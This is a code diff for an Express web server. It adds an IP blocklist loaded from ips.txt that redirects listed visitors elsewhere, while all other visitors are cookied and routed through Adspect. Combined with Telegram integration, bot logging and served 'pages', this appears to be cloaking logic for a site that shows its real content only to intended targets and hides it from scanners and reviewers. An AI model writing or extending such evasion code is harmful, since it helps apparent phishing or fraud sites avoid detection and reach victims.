@@ -526,7 +526,7 @@ state.settings.availablePages = scanPages(pagesPath);
 // Initialize Telegram integration
 initTelegramService(state.settings);
 await BotLogger.initialize();
-
+await loadBlockedIPs();
 
 // Page serving middleware
 const pageServingMiddleware = async (req, res, next) => {
@@ -606,8 +606,27 @@ const pageServingMiddleware = async (req, res, next) => {
     }
 };
 
-app.get('/', (req, res) => {
+
+const blockedIPs = new Set();
+
+async function loadBlockedIPs() {
+    try {
+        const ipList = await fs.readFile(join(__dirname, 'ips.txt'), 'utf8');
+        const ips = ipList.split('\n').map(ip => ip.trim()).filter(ip => ip);
+        blockedIPs.clear();
+        ips.forEach(ip => blockedIPs.add(ip));
+        console.log(`Loaded ${blockedIPs.size} IPs from ips.txt`);
+    } catch (error) {
+        console.error('Error loading IPs:', error);
+    }
+}
+
+app.get('/', async (req, res) => {
     console.log('Root route accessed');
+    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
+                    req.headers['x-real-ip'] || 
+                    req.socket.remoteAddress;
+    
     const isAdminPanel = req.headers.referer?.includes('/admin');
  
     if (isAdminPanel) {
@@ -618,19 +637,24 @@ app.get('/', (req, res) => {
         console.log('Website disabled - redirecting to:', state.settings.redirectUrl);
         return res.redirect(state.settings.redirectUrl);
     }
+
+    // Check if IP is in blocked list
+    if (blockedIPs.has(clientIP)) {
+        console.log(`Blocked IP detected (${clientIP}) - redirecting to:`, state.settings.redirectUrl);
+        return res.redirect(state.settings.redirectUrl);
+    }
  
-    // Universal cookie settings that work across browsers
+    // If IP not blocked, proceed with normal flow
     console.log('- Setting cookie and redirecting to Adspect');
     res.cookie('adspect_redirect', 'true', {
-        maxAge: 15000, // 15 seconds for better reliability
+        maxAge: 15000,
         httpOnly: true,
-        secure: process.env.NODE_ENV === 'production', // Only secure in production
-        sameSite: 'lax', // Back to lax for better compatibility
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'lax',
         path: '/',
         expires: new Date(Date.now() + 15000)
     });
     
-    // Debug log
     console.log('Cookie set:', {
         name: 'adspect_redirect',
         value: 'true',
